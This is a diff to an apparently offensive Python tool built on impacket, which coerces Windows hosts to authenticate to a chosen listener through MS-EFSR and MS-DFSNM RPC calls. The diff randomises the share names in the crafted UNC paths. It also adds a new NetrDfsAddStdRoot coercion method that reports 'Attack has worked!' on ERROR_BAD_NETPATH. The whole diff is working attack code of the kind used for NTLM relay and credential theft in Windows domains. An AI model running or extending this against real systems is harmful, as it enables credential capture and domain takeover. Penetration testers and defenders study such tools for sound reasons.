@@ -9,6 +9,7 @@ import argparse
 import os
 import sys
 import time
+import random
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.uuid import uuidtup_to_bin
@@ -29,6 +30,14 @@ banner = """
 
 
 #==========================================================================================================
+
+
+def gen_random_name(length=8):
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    name = ""
+    for k in range(length):
+        name += random.choice(alphabet)
+    return name
 
 
 class DCERPCSessionError(DCERPCException):
@@ -234,7 +243,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcOpenFileRaw()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['Flags'] = 0
                     if self.debug:
                         request.dump()
@@ -267,7 +276,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcEncryptFileSrv()
-                    request['FileName'] = '\\\\%s\\share\\settings.ini\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -300,7 +309,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcDecryptFileSrv()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['long'] = 0
                     if self.debug:
                         request.dump()
@@ -333,7 +342,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryUsersOnFile()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -366,7 +375,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryRecoveryAgents()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -398,7 +407,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcFileKeyInfo()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['InfoClass'] = 0
                     if self.debug:
                         request.dump()
@@ -444,6 +453,20 @@ class MS_EFSR(RPCProtocol):
 #=[MS-DFSNM]====================================================================================================
 
 
+class NetrDfsAddStdRoot(NDRCALL):
+    opnum = 12
+    structure = (
+        ('ServerName', WSTR),  # Type: WCHAR *
+        ('RootShare', WSTR),   # Type: WCHAR *
+        ('Comment', WSTR),     # Type: WCHAR *
+        ('ApiFlags', DWORD),   # Type: DWORD
+    )
+
+
+class NetrDfsAddStdRootResponse(NDRCALL):
+    structure = ()
+
+
 class NetrDfsRemoveStdRoot(NDRCALL):
     opnum = 13
     structure = (
@@ -475,7 +498,7 @@ class MS_DFSNM(RPCProtocol):
                 try:
                     request = NetrDfsRemoveStdRoot()
                     request['ServerName'] = '%s\x00' % listener
-                    request['RootShare'] = 'share\x00'
+                    request['RootShare'] = gen_random_name() + '\x00'
                     request['ApiFlags'] = 0
                     if self.debug:
                         request.dump()
@@ -499,14 +522,54 @@ class MS_DFSNM(RPCProtocol):
             if self.verbose:
                 print("   [!] Error: dce is None, you must call connect() first.")
 
+    def NetrDfsAddStdRoot(self, listener, max_retries=3):
+        call_name, call_opnum = "NetrDfsAddStdRoot", 12
+        if self.dce is not None:
+            tries = 0
+            while tries <= max_retries:
+                tries += 1
+                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
+                sys.stdout.flush()
+                try:
+                    request = NetrDfsAddStdRoot()
+                    request['ServerName'] = '%s\x00' % listener
+                    request['RootShare'] = gen_random_name() + '\x00'
+                    request['Comment'] = gen_random_name() + '\x00'
+                    request['ApiFlags'] = 0
+                    if self.debug:
+                        request.dump()
+                    resp = self.dce.request(request)
+                except Exception as e:
+                    if "ERROR_INVALID_NAME" in str(e):
+                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
+                        print("\x1b[1;91mERROR_INVALID_NAME\x1b[0m retrying in 20 seconds ...")
+                        time.sleep(20)
+                    elif "ERROR_BAD_NETPATH" in str(e):
+                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
+                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
+                        return True
+                    elif "rpc_s_access_denied" in str(e):
+                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
+                        return False
+                    elif self.debug:
+                        print("            [!]", e)
+        else:
+            if self.verbose:
+                print("   [!] Error: dce is None, you must call connect() first.")
+
+
     @classmethod
     def list_coerce_methods(cls):
         return [
+            ("NetrDfsAddStdRoot", 12, None),
             ("NetrDfsRemoveStdRoot", 13, None)
         ]
 
     def perform_coerce_calls(self, listener):
+        self.NetrDfsAddStdRoot(listener)
         self.NetrDfsRemoveStdRoot(listener)
+
 
 
 #=[MS-FSRVP]====================================================================================================
